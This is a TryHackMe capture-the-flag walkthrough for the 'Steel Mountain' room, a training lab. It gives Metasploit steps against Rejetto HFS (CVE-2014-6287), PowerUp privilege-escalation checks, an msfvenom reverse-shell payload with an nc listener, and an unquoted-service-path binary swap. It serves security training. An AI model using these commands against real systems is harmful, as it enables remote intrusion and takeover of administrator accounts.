## Steel Mountain | TryHackMe

This is the link for the room [Steel Mountain](https://tryhackme.com/room/steelmountain)

<img src="https://tryhackme-images.s3.amazonaws.com/room-icons/c9030a2b60bb7d1cf4fcb6e5032526d3.jpeg" width="300px" align="center">

---
Lets do this

## Reconnaissance

Access the website

<img src="https://user-images.githubusercontent.com/67650329/193285313-67691cd1-1438-489a-b317-5277c252209a.png" width="500px" align="center">

You can search photo on `Source Code`

<img src="https://user-images.githubusercontent.com/67650329/193285399-5fe0adcb-a48f-468d-bd9b-c06dd7ea832f.png" width="500px" align="center">

**Who is the employee of the month?**

**Answer: Steel Mountain**

## Enumeration 

`nmap -sC -sV -p- -T4 {IP}`

-sC = Run the default script.

-sV = Version of services.

-p- = Checking for all port.

-T4 = Scanning speed.

<img src="https://user-images.githubusercontent.com/67650329/193287415-a72928ee-8e2d-4be8-9b38-e2f3f4f20583.png" width="500px" align="center">

**Scan the machine with nmap. What is the other port running a web server on?**

**Answer: 8080**

## Vulnerability Analysis

<img src="https://user-images.githubusercontent.com/67650329/193287870-0d44a0c4-1321-4f65-9238-6d2f7349fe46.png" width="500px" align="center">

**Take a look at the other web server. What file server is running?**

**Answer: Rejetto HTTP File Server**


I Forgot to screenshot the version of Rejetto HTTP File Server. The version it's on the website port 8080 on left side bar.

<img src="https://user-images.githubusercontent.com/67650329/193288223-bb5d9a12-f1d5-464c-a779-e0e68896beb2.png" width="500px" align="center">

<img src="https://user-images.githubusercontent.com/67650329/193288667-87e4d54d-35f2-4b9a-a1b0-e22a096dab0c.png" width="500px" align="center">

**What is the CVE number to exploit this file server?**

**Answer: 2014-6287**

## Exploitation 

Use Metasploit for exploit

`msfconsole`

`search rejetto`

<img src="https://user-images.githubusercontent.com/67650329/193289703-9db4803b-ea4b-4e5e-8750-d76a4b13ad8c.png" width="500px" align="center">

`use 0`

<img src="https://user-images.githubusercontent.com/67650329/193289802-27ded491-1417-4097-a839-8479c96924bf.png" width="500px" align="center">

`Set RHOSTS {ip_target}`

`Set RPORT {8080}`

`Set LHOST {your ip}`

`exploit`

Wait the exploit you can make a coffee for waiting.

And You get the user flag on bill desktop.

<img src="https://user-images.githubusercontent.com/67650329/193290628-6489dcfe-adee-44dc-a53f-7777f6928c84.png" width="500px" align="center">

You can download the script first.

Download the script -> [Click Here](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)

After you download the script. Upload the script on the machine.

`upload PowerUp.ps1`

<img src="https://user-images.githubusercontent.com/67650329/193292090-52c37025-c66c-4723-b7cb-3eb3e32180cb.png" width="500px" align="center">

`load powershell` -> for Activation the powershell

`powershell_shell` -> Access the powershell

`. .\PowerUp.ps1`

`Invoke-AllChecks`

<img src="https://user-images.githubusercontent.com/67650329/193292160-a43fd0c8-6fb9-4ef4-8ff4-56a9de2bba45.png" width="500px" align="center">

<img src="https://user-images.githubusercontent.com/67650329/193292812-79530abe-df5e-4418-8166-7074f942ef45.png" width="500px" align="center">

**Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?**

**Answer: AdvancedSystemCareService9**

Download the new shell using this command

`msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe`

`nc -lvnp 4443` -> to listen

<img src="https://user-images.githubusercontent.com/67650329/193294959-69f62c9f-1e35-4079-b748-d9e59d2c7c50.png" width="500px" align="center">

You can use Ctrl+C to exit the shell

This step it's credential if you wrong upload you can't get in into the Administrator/Desktop

stop the AdvancedSystemCareService9 first

`stop sc AdvancedSystemCareService9`

You can use Ctrl+C to exit the machine and back to meterpreter

`upload ASCService.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"`

`shell` -> activate the shell to get back to the machine

`sc start AdvancedSystemCareService9` -> Start 

<img src="https://user-images.githubusercontent.com/67650329/193294214-5e2eaa55-d2b7-453a-b62a-13b12d8a9a2a.png" width="500px" align="center">

And you get in into the administration machine.

<img src="https://user-images.githubusercontent.com/67650329/193295134-84045283-d34f-4017-9eac-cbccc949aa41.png" width="500px" align="center">

And bam you get the Root flag.

<img src="https://user-images.githubusercontent.com/67650329/193296174-bfcb6dce-7083-49ae-b792-e5937902ec23.png" width="500px" align="center">

---
